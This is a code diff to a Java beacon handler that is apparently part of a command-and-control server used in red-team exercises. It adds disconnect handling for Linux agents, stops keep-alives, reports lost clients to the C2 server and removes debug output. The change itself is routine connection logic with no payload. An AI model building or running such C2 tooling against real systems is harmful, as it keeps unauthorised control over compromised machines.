@@ -144,13 +144,22 @@ public class BeaconClientHandler implements Runnable{
                 notify = false;
                 String response = duplexer.receive();
 
+                // When the linux clients disconnect, they don't actually stop, they just repeatedly send null over and over
+                if(response.equals("null")){
+                    sentinel = false;
+                    try{
+                        duplexer.close();
+                        keepAliveClass.stopKeepAlive();
+                    } catch (IOException d){
+                        d.printStackTrace();
+                    }
+                    beaconServer.sendDataToC2Server("Lost " + os + " Client at " + IPAddress);
+                    beaconServer.addDataToResponsesDictionaries(IPAddress, "DISCONNECTED");
+                }
+
                 // Every time a response is received, notify the pwnBoard lock, so that the thread will send a message to pwnBoard
                 // that we have an active connection with the agent.
                 pwnBoardCounter++;
-                if(pwnBoardCounter > 100){
-                    System.out.println("response from " + IPAddress);
-                    System.out.println(response);
-                }
                 if(pwnBoardCounter % 15 == 0){
                     synchronized(pwnBoardLock){
                         pwnBoardLock.notify();
@@ -193,6 +202,7 @@ public class BeaconClientHandler implements Runnable{
                 sentinel = false;
                 try{
                     duplexer.close();
+                    keepAliveClass.stopKeepAlive();
                 } catch (IOException d){
                     d.printStackTrace();
                 }
